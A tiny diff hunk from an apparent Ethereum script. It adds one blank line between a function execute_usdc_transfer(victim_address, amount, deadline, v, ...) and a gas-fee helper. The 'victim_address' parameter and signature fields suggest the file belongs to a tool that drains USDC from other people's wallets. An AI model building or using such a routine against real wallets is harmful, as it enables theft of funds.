@@ -157,6 +157,7 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
     except Exception as e:
         return None, f"EXECUTION_FAILED: {type(e).__name__}: {str(e)}"
 
+
 def get_gas_info():
     try:
         base = w3.eth.get_block('latest')['baseFeePerGas']
